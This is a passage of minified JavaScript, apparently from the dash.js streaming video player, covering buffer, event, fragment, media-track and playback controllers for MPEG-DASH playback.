Fa},setBuffer:function(Xa){Fa=Xa},getBufferLevel:function(){return db},getRangeAt:Y,setMediaSource:qa,getMediaSource:function(){return $a},appendInitSegment:function(Xa){return!!(Xa=Ib.extract(eb.id,Xa))&&(mb.info("Append Init fragment",Ta," with representationId:",Xa.representationId," and quality:",Xa.quality,", data size:",Xa.bytes.byteLength),O(Xa),!0)},replaceBuffer:function(){oc=!0},getIsBufferingCompleted:function(){return Ab},getIsPruningInProgress:function(){return nb},reset:function(Xa,ob){Ba.off(J.default.DATA_UPDATE_COMPLETED,ha,this),Ba.off(J.default.INIT_FRAGMENT_LOADED,F,this),Ba.off(J.default.MEDIA_FRAGMENT_LOADED,P,this),Ba.off(J.default.QUALITY_CHANGE_REQUESTED,ja,this),Ba.off(J.default.STREAM_COMPLETED,ka,this),Ba.off(J.default.PLAYBACK_PLAYING,A,this),Ba.off(J.default.PLAYBACK_PROGRESS,H,this),Ba.off(J.default.PLAYBACK_TIME_UPDATED,H,this),Ba.off(J.default.PLAYBACK_RATE_CHANGED,fa,this),Ba.off(J.default.PLAYBACK_SEEKING,W,this),Ba.off(J.default.PLAYBACK_SEEKED,aa,this),Ba.off(J.default.PLAYBACK_STALLED,B,this),Ba.off(J.default.WALLCLOCK_TIME_UPDATED,C,this),Ba.off(J.default.CURRENT_TRACK_CHANGED,la,this),Ba.off(J.default.SOURCEBUFFER_REMOVE_COMPLETED,oa,this),za(Xa,ob)}},mb=(0,D.default)(Ca).getInstance().getLogger(ib),Ib=(0,I.default)(Ca).getInstance(),za(),ib}Object.defineProperty(M,"__esModule",{value:!0});var p=v(u(108)),l=v(u(109)),f=v(u(149)),g=v(u(104)),t=v(u(103)),r=v(u(111)),x=v(u(117)),z=v(u(46)),J=v(u(54)),E=v(u(47)),D=v(u(45)),I=v(u(213)),L=v(u(225)),G=v(u(51)),N=u(241);m.__dashjs_factory_name="BufferController",M.default=E.default.getClassFactory(m),da.exports=M.default},{103:103,104:104,108:108,109:109,111:111,117:117,149:149,213:213,225:225,241:241,45:45,46:46,47:47,51:51,54:54}],115:[function(u,da,M){function v(r){return r&&r.__esModule?r:{default:r}}function m(){function r(){if(!R||!Q)throw Error("setConfig function has to be called previously")}function x(){W=!1,w={},h={},P=null,ja=!(F={}),O=Date.now()/1e3}function z(){try{var aa;if(!ja){var ma=(aa=Q.getTime())-O;ma=0<O?Math.max(0,ma):0,J(h,ma,aa),J(w,ma,aa);try{if(F){var H=Q.getTime(),B=Object.keys(F);for(ma=0;ma<B.length;ma++){var A=B[ma],Y=F[A];null!==Y&&(Y.duration+Y.calculatedPresentationTime)/Y.eventStream.timescale<H&&(N.debug("Remove Event "+A+" at time "+H),Y=null,delete F[A])}}}catch(Z){}O=aa}ja=!1}catch(Z){ja=!1}}function J(aa,ma,H){try{if(aa)for(var B=Object.keys(aa),A=0;A<B.length;A++){var Y,Z=B[A],na=aa[Z];if(void 0!==na)if((Y=na.calculatedPresentationTime/na.eventStream.timescale)<=H&&H<=Y+ma)D(Z,na,aa);else{try{var T=Y<H-ma}catch(ia){T=!1}var pa;if(!(pa=T))try{pa=na.calculatedPresentationTime/1e3>na.eventStream.period.start+na.eventStream.period.duration}catch(ia){pa=!1}pa&&(N.debug("Deleting event "+Z+" as it is expired or invalid"),delete aa[Z])}}}catch(ia){}}function E(aa){try{var ma=function(){var H=Object.keys(aa),B=Q.getTime();if(!H||0===H.length)return{v:void 0};var A=aa[H[0]].eventStream&&aa[H[0]].eventStream.period&&!isNaN(aa[H[0]].eventStream.period.duration)?aa[H[0]].eventStream.period.duration:NaN,Y=aa[H[0]].eventStream&&aa[H[0]].eventStream.period&&!isNaN(aa[H[0]].eventStream.period.start)?aa[H[0]].eventStream.period.start:NaN;if(isNaN(A)||isNaN(Y))return{v:void 0};H.forEach((function(Z){var na=aa[Z];300>Math.abs(na.calculatedPresentationTime/na.eventStream.timescale-B)&&D(Z,na,aa)}))}();if("object"==typeof ma)return ma.v}catch(H){}}function D(aa,ma,H){try{var B=Q.getTime();if(0<ma.duration&&(F[aa]=ma),"urn:mpeg:dash:event:2012"===ma.eventStream.schemeIdUri&&1==ma.eventStream.value){if(0!==ma.duration||0!==ma.presentationTimeDelta){N.debug("Starting manifest refresh event "+aa+" at "+B);try{r(),R.refreshManifest()}catch(Y){}}}else if("urn:mpeg:dash:event:callback:2015"===ma.eventStream.schemeIdUri&&1==ma.eventStream.value){N.debug("Starting callback event "+aa+" at "+B);var A=ma.messageData;try{(0,t.default)(I).create({}).load({method:"get",url:A,request:{responseType:"arraybuffer"}})}catch(Y){throw Y}}else N.debug("Starting event "+aa+" at "+B),L.trigger(ma.eventStream.schemeIdUri,{event:ma});delete H[aa]}catch(Y){}}var G,I=this.context,L=(0,f.default)(I).getInstance(),N=void 0,w=void 0,h=void 0,F=void 0,P=void 0,O=void 0,R=void 0,Q=void 0,ja=void 0,W=void 0;return G={addInlineEvents:function(aa){try{if(r(),aa)for(var ma=0;ma<aa.length;ma++){var H=aa[ma];w[H.id]=H,N.debug("Add inline event with id "+H.id)}N.debug("Added "+aa.length+" inline events")}catch(B){throw B}},addInbandEvents:function(aa){try{r();for(var ma=0;ma<aa.length;ma++){var H=aa[ma];if(H.id in h)N.debug("Repeated event with id "+H.id);else{if("urn:mpeg:dash:event:2012"===H.eventStream.schemeIdUri&&void 0===h[H.id]){var B=void 0,A=void 0,Y=void 0,Z=H;try{1==Z.eventStream.value&&(Y=Z.eventStream.timescale||1,A=Z.calculatedPresentationTime/Y,B=4294967295==Z.calculatedPresentationTime?NaN:(Z.calculatedPresentationTime+Z.duration)/Y,N.info("Manifest validity changed: Valid until: "+A+"; remaining duration: "+B),L.trigger(g.default.MANIFEST_VALIDITY_CHANGED,{id:Z.id,validUntil:A,newDuration:B,newManifestValidAfter:NaN}))}catch(na){}}h[H.id]=H,N.debug("Add inband event with id "+H.id)}}z()}catch(na){throw na}},start:function(){try{r(),N.debug("Start Event Controller"),W||isNaN(100)||(W=!0,P=setInterval(z,100))}catch(aa){throw aa}},setConfig:function(aa){try{aa&&(aa.manifestUpdater&&(R=aa.manifestUpdater),aa.playbackController&&(Q=aa.playbackController))}catch(ma){throw ma}},reset:function(){try{if(null!==P&&W){clearInterval(P),P=null,W=!1;try{E(h),E(w)}catch(aa){}}}catch(aa){throw aa}x()}},N=(0,l.default)(I).getInstance().getLogger(G),x(),G}Object.defineProperty(M,"__esModule",{value:!0});var p=v(u(47)),l=v(u(45)),f=v(u(46)),g=v(u(54)),t=v(u(159));m.__dashjs_factory_name="EventController",M.default=p.default.getSingletonFactory(m),da.exports=M.default},{159:159,45:45,46:46,47:47,54:54}],116:[function(u,da,M){function v(D){return D&&D.__esModule?D:{default:D}}function m(D){function I(){for(var ja in Q)Q[ja].reset();Q={}}function L(ja){var W,aa,ma,H,B,A,Y;ja.sender&&(W=ja.request,aa=ja.response,ma=W.isInitializationRequest(),H=W.mediaInfo.streamInfo,ja.error&&(ja.request.mediaType!==p.default.AUDIO&&ja.request.mediaType!==p.default.VIDEO&&ja.request.mediaType!==p.default.FRAGMENTED_TEXT||N.trigger(x.default.SERVICE_LOCATION_BLACKLIST_ADD,{entry:ja.request.serviceLocation})),aa&&H?(B=H.id,A=ja.type!==x.default.FRAGMENT_LOADING_PROGRESS,(Y=new l.default).streamId=B,Y.mediaInfo=W.mediaInfo,Y.segmentType=W.type,Y.start=W.startTime,Y.duration=W.duration,Y.end=Y.start+Y.duration,Y.bytes=aa,Y.index=W.index,Y.quality=W.quality,Y.representationId=W.representationId,Y.endFragment=A,N.trigger(ma?x.default.INIT_FRAGMENT_LOADED:x.default.MEDIA_FRAGMENT_LOADED,{chunk:Y,request:W})):R.warn("No "+W.mediaType+" bytes to push or stream is inactive."))}D=D||{};var O,G=this.context,N=(0,r.default)(G).getInstance(),w=D.errHandler,h=D.mediaPlayerModel,F=D.dashMetrics,P=(0,E.default)(G).getInstance(),R=void 0,Q=void 0;return O={getModel:function(ja,W){var aa=Q[W];return aa||(aa=(0,f.default)(G).create({streamId:ja,dashMetrics:F,fragmentLoader:(0,g.default)(G).create({dashMetrics:F,mediaPlayerModel:h,errHandler:w,requestModifier:(0,t.default)(G).getInstance(),settings:D.settings,boxParser:D.boxParser,eventBus:N,events:x.default,errors:z.default,dashConstants:D.dashConstants,urlUtils:D.urlUtils}),debug:P,eventBus:N,events:x.default}),Q[W]=aa),aa},reset:function(){N.off(x.default.FRAGMENT_LOADING_COMPLETED,L,this),N.off(x.default.FRAGMENT_LOADING_PROGRESS,L,this),I()}},R=P.getLogger(O),I(),N.on(x.default.FRAGMENT_LOADING_COMPLETED,L,O),N.on(x.default.FRAGMENT_LOADING_PROGRESS,L,O),O}Object.defineProperty(M,"__esModule",{value:!0});var p=v(u(108)),l=v(u(226)),f=v(u(149)),g=v(u(97)),t=v(u(217)),r=v(u(46)),x=v(u(54)),z=v(u(51)),J=v(u(47)),E=v(u(45));m.__dashjs_factory_name="FragmentController",M.default=J.default.getClassFactory(m),da.exports=M.default},{108:108,149:149,217:217,226:226,45:45,46:46,47:47,51:51,54:54,97:97}],117:[function(u,da,M){function v(r){return r&&r.__esModule?r:{default:r}}function m(){function r(B,A){return B&&A?(A=A.id,R[A]&&R[A][B]?R[A][B].list:[]):[]}function x(B,A){return!B||!A||A&&!R[A.id]?null:R[A.id][B].current}function z(B,A){if(B&&B.streamInfo){var Y,Z=B.type,na=B.streamInfo,T=na.id;na=x(Z,na),R[T]&&R[T][Z]&&!L(B,na)&&(R[T][Z].current=B,!R[T][Z].current||A&&Z===p.default.FRAGMENTED_TEXT||F.trigger(l.default.CURRENT_TRACK_CHANGED,{oldMediaInfo:na,newMediaInfo:B,switchMode:W[Z]}),!A)&&(B=(Y={lang:B.lang,viewpoint:B.viewpoint,roles:B.roles,accessibility:B.accessibility,audioChannelConfiguration:B.audioChannelConfiguration}).lang||Y.viewpoint||Y.role&&0<Y.role.length||Y.accessibility&&0<Y.accessibility.length||Y.audioChannelConfiguration&&0<Y.audioChannelConfiguration.length?Y:null)&&R[T][Z].storeLastSettings&&(B.roles&&(B.role=B.roles[0],delete B.roles),B.accessibility&&(B.accessibility=B.accessibility[0]),B.audioChannelConfiguration&&(B.audioChannelConfiguration=B.audioChannelConfiguration[0]),aa.setSavedMediaSettings(Z,B))}}function J(B,A){B&&A&&(Q[B]=A)}function E(B){return B?Q[B]:null}function D(){return ja||"highestBitrate"}function I(B){return B===p.default.AUDIO||B===p.default.VIDEO||B===p.default.TEXT||B===p.default.FRAGMENTED_TEXT||B===p.default.IMAGE}function L(B,A){if(!B&&!A)return!0;if(!B||!A)return!1;var Y=B.viewpoint===A.viewpoint,Z=B.lang===A.lang,na=B.roles.toString()===A.roles.toString(),T=B.accessibility.toString()===A.accessibility.toString(),pa=B.audioChannelConfiguration.toString()===A.audioChannelConfiguration.toString();return B.id===A.id&&Y&&Z&&na&&T&&pa}function G(){R={},Q={audio:null,video:null,fragmentedText:null},W={audio:"alwaysReplace",video:"neverReplace"}}function N(B,A){var Y=!B.lang||A.lang.match(B.lang),Z=!B.viewpoint||B.viewpoint===A.viewpoint,na=!B.role||!!A.roles.filter((function(pa){return pa===B.role}))[0],T=!B.accessibility||!!A.accessibility.filter((function(pa){return pa===B.accessibility}))[0];return A=!B.audioChannelConfiguration||!!A.audioChannelConfiguration.filter((function(pa){return pa===B.audioChannelConfiguration}))[0],Y&&Z&&na&&T&&A}function w(B,A){function Y(T){var pa=0,ia=[],S=void 0;return T.forEach((function(V){S=Math.max.apply(Math,V.bitrateList.map((function(oa){return oa.bandwidth}))),pa<S?(pa=S,ia=[V]):S===pa&&ia.push(V)})),ia}function Z(T){var pa=0,ia=[],S=void 0;return T.forEach((function(V){S=V.representationCount,pa<S?(pa=S,ia=[V]):S===pa&&ia.push(V)})),ia}if(B===p.default.FRAGMENTED_TEXT)return A[0];var na=[];switch(B=D()){case"highestBitrate":1<(na=Y(A)).length&&(na=Z(na));break;case"widestRange":1<(na=Z(A)).length&&(na=Y(A));break;default:O.warn("Track selection mode is not supported: "+B)}return na[0]}var P,h=this.context,F=(0,f.default)(h).getInstance(),O=void 0,R=void 0,Q=void 0,ja=void 0,W=void 0,aa=void 0,ma=["alwaysReplace","neverReplace"],H=["highestBitrate","widestRange"];return P={checkInitialMediaSettingsForType:function(B,A){var Y=E(B);A=r(B,A);var Z=[];Y||J(B,Y=aa.getSavedMediaSettings(B)),A&&0!==A.length&&(Y&&A.forEach((function(na){N(Y,na)&&Z.push(na)})),0===Z.length?z(w(B,A),!0):1<Z.length?z(w(B,Z)):z(Z[0]))},addTrack:function(B){if(B){var A=B.type;if(I(A)){var Y=B.streamInfo.id;R[Y]||(R[Y]={audio:{list:[],storeLastSettings:!0,current:null},video:{list:[],storeLastSettings:!0,current:null},text:{list:[],storeLastSettings:!0,current:null},fragmentedText:{list:[],storeLastSettings:!0,current:null},image:{list:[],storeLastSettings:!0,current:null}});for(var Z=0,na=(Y=R[Y][A].list).length;Z<na;++Z)if(L(Y[Z],B))return;Y.push(B),(Y=E(A))&&N(Y,B)&&!x(A,B.streamInfo)&&z(B)}}},getTracksFor:r,getCurrentTrackFor:x,isCurrentTrack:function(B){if(!B)return!1;var A=B.type,Y=B.streamInfo.id;return R[Y]&&R[Y][A]&&L(R[Y][A].current,B)},setTrack:z,setInitialSettings:J,getInitialSettings:E,setSwitchMode:function(B,A){-1!==ma.indexOf(A)?W[B]=A:O.warn("Track switch mode is not supported: "+A)},getSwitchMode:function(B){return W[B]},setSelectionModeForInitialTrack:function(B){-1!==H.indexOf(B)?ja=B:O.warn("Track selection mode is not supported: "+B)},getSelectionModeForInitialTrack:D,isMultiTrackSupportedByType:I,isTracksEqual:L,matchSettings:N,saveTextSettingsDisabled:function(){aa.setSavedMediaSettings(p.default.FRAGMENTED_TEXT,null)},setConfig:function(B){B&&B.domStorage&&(aa=B.domStorage)},reset:G},O=(0,t.default)(h).getInstance().getLogger(P),G(),P}Object.defineProperty(M,"__esModule",{value:!0});var p=v(u(108)),l=v(u(54)),f=v(u(46)),g=v(u(47)),t=v(u(45));m.__dashjs_factory_name="MediaController",(u=g.default.getSingletonFactory(m)).TRACK_SWITCH_MODE_NEVER_REPLACE="neverReplace",u.TRACK_SWITCH_MODE_ALWAYS_REPLACE="alwaysReplace",u.TRACK_SELECTION_MODE_HIGHEST_BITRATE="highestBitrate",u.TRACK_SELECTION_MODE_WIDEST_RANGE="widestRange",u.DEFAULT_INIT_TRACK_SELECTION_MODE="highestBitrate",g.default.updateSingletonFactory(m.__dashjs_factory_name,u),M.default=u,da.exports=M.default},{108:108,45:45,46:46,47:47,54:54}],118:[function(u,da,M){function v(f){return f&&f.__esModule?f:{default:f}}function m(){var f,g=void 0,t=this.context;return f={createMediaSource:function(){var r="WebKitMediaSource"in wa;return"MediaSource"in wa?new MediaSource:r?new WebKitMediaSource:null},attachMediaSource:function(r,x){return r=wa.URL.createObjectURL(r),x.setSource(r),r},detachMediaSource:function(r){r.setSource(null)},setDuration:function(r,x){return r.duration!=x&&(r.duration=x),r.duration},setSeekable:function(r,x,z){r&&"function"==typeof r.setLiveSeekableRange&&"function"==typeof r.clearLiveSeekableRange&&"open"===r.readyState&&0<=x&&x<z&&(r.clearLiveSeekableRange(),r.setLiveSeekableRange(x,z))},signalEndOfStream:function(r){if(r&&"open"===r.readyState){for(var x=r.sourceBuffers,z=0;z<x.length;z++)if(x[z].updating||0===x[z].buffered.length)return;g.info("call to mediaSource endOfStream"),r.endOfStream()}}},g=(0,l.default)(t).getInstance().getLogger(f),f}Object.defineProperty(M,"__esModule",{value:!0});var p=v(u(47)),l=v(u(45));m.__dashjs_factory_name="MediaSourceController",M.default=p.default.getSingletonFactory(m),da.exports=M.default},{45:45,47:47}],119:[function(u,da,M){function v(x){return x&&x.__esModule?x:{default:x}}function m(){function x(ua){var Ka,Fa,tb,Eb;La&&isNaN(Ya)||(Ka=Ya,isNaN(Ka)&&(Pa?(Ka=ua.liveStartTime,(tb=(Fa=Ca.getCurrentDVRInfo())?Fa.range:null)&&(Eb=O(Da.start,!0),isNaN(Eb)||(xa.info("Start time from URI parameters: "+Eb),Ka=Math.max(Math.min(Ka,Eb),tb.start)))):(Ka=Da.start,Eb=O(Da.start,!1),!isNaN(Eb)&&Eb<Ka+Da.duration&&(xa.info("Start time from URI parameters: "+Eb),Ka=Math.max(Ka,Eb)))),isNaN(Ka)||Ka===Ga.getTime()||(qa.trigger(g.default.PLAYBACK_SEEKING,{seekTime:Ka}),L(Ka,!1,!0)))}function z(){return parseFloat((Da.start+Da.duration-G()).toFixed(5))}function J(){Da&&Ga&&Ga.getElement()?Ga.play():Ta=!0}function E(){return Da&&Ga?Ga.isPaused():null}function D(){Da&&Ga&&Ga.pause()}function I(){return Da&&Ga?Ga.isSeeking():null}function L(ua,Ka,Fa){Da&&Ga&&ua!==(isNaN(mb)?Ga.getTime():mb)&&(!0===Fa?(Ga.removeEventListener("seeking",A),xa.info("Requesting internal seek to time: "+ua)):(mb=ua,qa.trigger(g.default.PLAYBACK_SEEK_ASKED),xa.info("Requesting seek to time: "+ua)),Ga.setCurrentTime(ua,Ka))}function G(){return Da&&Ga?Ga.getTime():null}function N(){var ua,Ka=G();return!Pa||isNaN(ib)||(ua=ib/1e3)<Ka&&(Ka-=ua),Ka}function w(){return Da&&Ga?Ga.getPlaybackRate():null}function h(){return Da&&Ga?Ga.getEnded():null}function F(){if(!Pa||isNaN(ib))return NaN;var ua=N();if(isNaN(ua)||0===ua)return 0;var Ka=(new Date).getTime()+1e3*Ra.getClientTimeOffset();return Math.max(((Ka-ib-1e3*ua)/1e3).toFixed(3),0)}function P(){La=Ta=!1,ib=bb=0,mb=Ya=NaN,Ga&&(qa.off(g.default.STREAM_INITIALIZED,x,this),qa.off(g.default.DATA_UPDATE_COMPLETED,ja,this),qa.off(g.default.BUFFER_LEVEL_STATE_CHANGED,ka,this),qa.off(g.default.LOADING_PROGRESS,ha,this),qa.off(g.default.PLAYBACK_PROGRESS,oa,this),qa.off(g.default.PLAYBACK_TIME_UPDATED,oa,this),qa.off(g.default.PLAYBACK_ENDED,S,this),qa.off(g.default.STREAM_INITIALIZING,C,this),clearInterval(hb),hb=null,Ga.removeEventListener("canplay",W),Ga.removeEventListener("play",aa),Ga.removeEventListener("waiting",ma),Ga.removeEventListener("playing",H),Ga.removeEventListener("pause",B),Ga.removeEventListener("error",V),Ga.removeEventListener("seeking",A),Ga.removeEventListener("seeked",Y),Ga.removeEventListener("timeupdate",Z),Ga.removeEventListener("progress",na),Ga.removeEventListener("ratechange",T),Ga.removeEventListener("loadedmetadata",pa),Ga.removeEventListener("stalled",la),Ga.removeEventListener("ended",ia)),Pa=Da=Ga=hb=null}function O(ua,Ka){var Fa=Za.getURIFragmentData();return Fa&&Fa.t?(Fa.t=Fa.t.split(",")[0],Ka&&-1!==Fa.t.indexOf("posix:")?parseInt(Fa.t.substring(6)):ua+parseInt(Fa.t)):NaN}function R(){null===hb&&(hb=setInterval((function(){if(qa.trigger(g.default.WALLCLOCK_TIME_UPDATED,{isDynamic:Pa,time:new Date}),Pa&&E()){var ua=Date.now();(!qb||qb+500<ua)&&(qb=ua,Z())}}),$a.get().streaming.wallclockTimeUpdateInterval))}function Q(){var ua,Ka,Fa,tb;!E()&&Pa&&0!==Ga.getReadyState()&&(ua=N(),Ka=(tb=(Fa=Ca.getCurrentDVRInfo())?Fa.range:null)?ua>tb.end?Math.max(tb.end-2*Da.manifestInfo.minBufferTime,tb.start):0<ua&&ua+.25<tb.start&&31536e4>Math.abs(ua-tb.start)?tb.start:ua:NaN,isNaN(Ka)||Ka===ua||L(Ka))}function ja(ua){var Ka,Fa;ua.error||null!==(Fa=(Ka=Ba.convertDataToRepresentationInfo(ua.currentRepresentation))?Ka.mediaInfo.streamInfo:null)&&Da.id===Fa.id&&(Da=Fa,Q())}function W(){qa.trigger(g.default.CAN_PLAY)}function aa(){xa.info("Native video element event: play"),Q(),R(),qa.trigger(g.default.PLAYBACK_STARTED,{startTime:G()})}function ma(){xa.info("Native video element event: waiting"),qa.trigger(g.default.PLAYBACK_WAITING,{playingTime:G()})}function H(){xa.info("Native video element event: playing"),qa.trigger(g.default.PLAYBACK_PLAYING,{playingTime:G()})}function B(){xa.info("Native video element event: pause"),qa.trigger(g.default.PLAYBACK_PAUSED,{ended:h()})}function A(){var ua=G();isNaN(mb)||mb===ua||(ua=mb),mb=NaN,xa.info("Seeking to: "+ua),R(),qa.trigger(g.default.PLAYBACK_SEEKING,{seekTime:ua})}function Y(){xa.info("Native video element event: seeked"),qa.trigger(g.default.PLAYBACK_SEEKED),Ga.addEventListener("seeking",A)}function Z(){Da&&qa.trigger(g.default.PLAYBACK_TIME_UPDATED,{timeToEnd:z(),time:G()})}function na(){qa.trigger(g.default.PLAYBACK_PROGRESS)}function T(){var ua=w();xa.info("Native video element event: ratechange: ",ua),qa.trigger(g.default.PLAYBACK_RATE_CHANGED,{playbackRate:ua})}function pa(){xa.info("Native video element event: loadedmetadata"),qa.trigger(g.default.PLAYBACK_METADATA_LOADED),R()}function ia(){xa.info("Native video element event: ended"),D(),clearInterval(hb),hb=null,qa.trigger(g.default.PLAYBACK_ENDED,{isLast:za.getActiveStreamInfo().isLast})}function S(ua){hb&&ua.isLast&&(xa.info("onPlaybackEnded -- PLAYBACK_ENDED but native video element didn't fire ended"),Ga.setCurrentTime(Da.start+Da.duration),D(),clearInterval(hb),hb=null)}function V(ua){qa.trigger(g.default.PLAYBACK_ERROR,{error:(ua.target||ua.srcElement).error})}function oa(){var ua,Ka,Fa;Pa&&$a.get().streaming.lowLatencyEnabled&&0<$a.get().streaming.liveCatchUpPlaybackRate&&!E()&&!I()&&(ua=F(),Ka=Math.abs(ua-eb.getLiveDelay()),Fa=eb.getLiveCatchupLatencyThreshold(),($a.get().streaming.lowLatencyEnabled&&0<$a.get().streaming.liveCatchUpPlaybackRate&&0<G()&&Ka>$a.get().streaming.liveCatchUpMinDrift&&(isNaN(Fa)||ua<=Fa)?function(){var tb,Eb,Sa,rb,Bb,Qb;Ga&&(tb=$a.get().streaming.liveCatchUpPlaybackRate,Eb=eb.getLiveDelay(),rb=5*(Sa=F()-Eb),Bb=1-tb+2*tb/(1+Math.pow(Math.E,-rb)),Ab&&(Qb=null,za.getActiveStreamProcessors().forEach((function(Vb){Vb=Vb.getBufferLevel(),Qb=null===Qb?Vb:Math.min(Qb,Vb)})),Eb/2<Qb?Ab=!1:0<Sa&&(Bb=1)),Math.abs(Ga.getPlaybackRate()-Bb)>db&&Ga.setPlaybackRate(Bb),0<$a.get().streaming.liveCatchUpMaxDrift&&!Db&&Sa>$a.get().streaming.liveCatchUpMaxDrift?(xa.info("Low Latency catchup mechanism. Latency too high, doing a seek to live point"),Db=!0,function(){var Qb=Ca.getCurrentDVRInfo();L((Qb?Qb.range:null).end-eb.getLiveDelay(),!0,!1)}()):Db=!1)}:ba)())}function ba(){Ga&&Ga.setPlaybackRate(1)}function ha(ua){var Ka,Fa;!1!==ua.stream||!$a.get().streaming.lowLatencyEnabled||isNaN(ua.request.duration)||(Ka=1.2*ua.request.duration)>eb.getLiveDelay()&&(xa.warn("Browser does not support fetch API with StreamReader. Increasing live delay to be 20% higher than segment duration:",Ka.toFixed(2)),Fa={streaming:{liveDelay:Ka}},$a.update(Fa))}function ka(ua){ua.streamId===Da.id&&($a.get().streaming.lowLatencyEnabled?ua.state!==l.default.BUFFER_EMPTY||I()||Ab||(Ab=!0,ba()):Ga.setStallState(ua.mediaType,ua.state===l.default.BUFFER_EMPTY))}function la(ua){qa.trigger(g.default.PLAYBACK_STALLED,{e:ua})}function C(ua){var Ka=ua.streamInfo;if(ua=ua.mediaInfo,Ka&&Ka.manifestInfo&&Ka.manifestInfo.serviceDescriptions){for(var Fa=void 0,tb=0;tb<Ka.manifestInfo.serviceDescriptions.length;tb++){var Eb=Ka.manifestInfo.serviceDescriptions[tb];if(Eb.schemeIdUri===p.default.SERVICE_DESCRIPTION_LL_SCHEME){Fa=Eb;break}}Fa&&ua&&ua.supplementalProperties&&"true"===ua.supplementalProperties[p.default.SUPPLEMENTAL_PROPERTY_LL_SCHEME]&&(Fa.latency&&0<Fa.latency.target&&(xa.debug("Apply LL properties coming from service description. Target Latency (ms):",Fa.latency.target),$a.update({streaming:{lowLatencyEnabled:!0,liveDelay:Fa.latency.target/1e3,liveCatchUpMinDrift:Fa.latency.max>Fa.latency.target?(Fa.latency.max-Fa.latency.target)/1e3:void 0}})),Fa.playbackRate&&1<Fa.playbackRate.max&&(xa.debug("Apply LL properties coming from service description. Max PlaybackRate:",Fa.playbackRate.max),$a.update({streaming:{lowLatencyEnabled:!0,liveCatchUpPlaybackRate:Fa.playbackRate.max-1}})))}}var va,fa=this.context,qa=(0,f.default)(fa).getInstance(),xa=void 0,za=void 0,Ca=void 0,Ba=void 0,Ga=void 0,Ra=void 0,La=void 0,Ya=void 0,hb=void 0,bb=void 0,Da=void 0,Pa=void 0,eb=void 0,Ta=void 0,qb=void 0,ib=void 0,mb=void 0,Db=void 0,Ab=void 0,db=void 0,Za=void 0,$a=void 0;return va={initialize:function(ua,Ka,Fa){Da=ua,Ga.addEventListener("canplay",W),Ga.addEventListener("play",aa),Ga.addEventListener("waiting",ma),Ga.addEventListener("playing",H),Ga.addEventListener("pause",B),Ga.addEventListener("error",V),Ga.addEventListener("seeking",A),Ga.addEventListener("seeked",Y),Ga.addEventListener("timeupdate",Z),Ga.addEventListener("progress",na),Ga.addEventListener("ratechange",T),Ga.addEventListener("loadedmetadata",pa),Ga.addEventListener("stalled",la),Ga.addEventListener("ended",ia),Pa=Da.manifestInfo.isDynamic,La=!(Ab=Db=!1)===Ka,Ya=Fa,ua="undefined"!=typeof navigator?navigator.userAgent.toLowerCase():"",db=/safari/.test(ua)&&!/chrome/.test(ua)?.25:.02,qa.on(g.default.STREAM_INITIALIZED,x,this),qa.on(g.default.DATA_UPDATE_COMPLETED,ja,this),qa.on(g.default.LOADING_PROGRESS,ha,this),qa.on(g.default.BUFFER_LEVEL_STATE_CHANGED,ka,this),qa.on(g.default.PLAYBACK_PROGRESS,oa,this),qa.on(g.default.PLAYBACK_TIME_UPDATED,oa,this),qa.on(g.default.PLAYBACK_ENDED,S,this),qa.on(g.default.STREAM_INITIALIZING,C,this),Ta&&(Ta=!1,J())},setConfig:function(ua){ua&&(ua.streamController&&(za=ua.streamController),ua.dashMetrics&&(Ca=ua.dashMetrics),ua.mediaPlayerModel&&(eb=ua.mediaPlayerModel),ua.adapter&&(Ba=ua.adapter),ua.videoModel&&(Ga=ua.videoModel),ua.timelineConverter&&(Ra=ua.timelineConverter),ua.uriFragmentModel&&(Za=ua.uriFragmentModel),ua.settings&&($a=ua.settings))},getStartTimeFromUriParameters:O,getTimeToStreamEnd:z,getTime:G,getNormalizedTime:N,getPlaybackRate:w,getPlayedRanges:function(){return Da&&Ga?Ga.getPlayedRanges():null},getEnded:h,getIsDynamic:function(){return Pa},getStreamController:function(){return za},computeAndSetLiveDelay:function(ua,Ka,Fa){var tb,Eb,Sa;ua=!isNaN(ua)&&isFinite(ua)?ua:NaN;var rb=Ba.getSuggestedPresentationDelay();return Fa=$a.get().streaming.lowLatencyEnabled?0:eb.getLiveDelay()?eb.getLiveDelay():null===$a.get().streaming.liveDelayFragmentCount||isNaN($a.get().streaming.liveDelayFragmentCount)||isNaN(ua)?!0===$a.get().streaming.useSuggestedPresentationDelay&&null!==rb&&!isNaN(rb)&&0<rb?rb:isNaN(ua)?isNaN(Fa)?4*Da.manifestInfo.minBufferTime:4*Fa:4*ua:ua*$a.get().streaming.liveDelayFragmentCount,null!==(Eb=Ba.getAvailabilityStartTime())&&(ib=Eb),Sa=0<Ka?(tb=Math.max(Ka-10,Ka/2),Math.min(Fa,tb)):Fa,bb=Sa},getLiveDelay:function(){return bb},setLiveDelay:function(ua){!(1>=arguments.length||void 0===arguments[1])&&arguments[1]&&ua<bb||(bb=ua)},getCurrentLiveLatency:F,play:J,isPaused:E,pause:D,isSeeking:I,seek:L,reset:P},xa=(0,r.default)(fa).getInstance().getLogger(va),P(),va}Object.defineProperty(M,"__esModule",{value:!0});var p=v(u(108)),l=v(u(109)),f=v(u(46)),g=v(u(54)),t=v(u(47)),r=v(u(45));m.__dashjs_factory_name="PlaybackController",M.default=t.default.getSingletonFactory(m),da.exports=M.default},{108:108,109:109,45:45,46:46,47:47,54:54}],120:[function(u,da,M){function v(E){return E&&E.__esModule?E:{default:E}}function m(E){function D(){return!1===Ba}function I(){D()||Ca&&!qa.getIsBufferingCompleted()&&(za.debug("Schedule Controller starts"),Ba=!1,ia.createPlaylistTraceMetrics(Ca.id,1e3*ba.getTime(),ba.getPlaybackRate()),N(0))}function L(){Ba||(za.debug("Schedule Controller stops"),Ba=!0,clearTimeout(La))}function G(){var db,Za;Ba||Ga||ba.isPaused()&&!va.get().streaming.scheduleWhilePaused||(la===p.default.FRAGMENTED_TEXT||la===p.default.TEXT)&&!ha.isTextEnabled()||qa.getIsBufferingCompleted()?L():(function(){var Ka,$a=ba.getTime(),ua=1.5;if(isNaN(Ca.fragmentDuration)&&(ua=(Ka=ia.getCurrentSchedulingInfo(Ca.mediaInfo.type))?1.5*Ka.duration:1.5),($a=V.getRequests({state:g.default.FRAGMENT_MODEL_EXECUTED,time:$a+ua,threshold:0})[0])&&-1===Ta.indexOf($a)&&!pa.getIsTextTrack(C)){Ka=va.get().streaming.fastSwitchEnabled;var 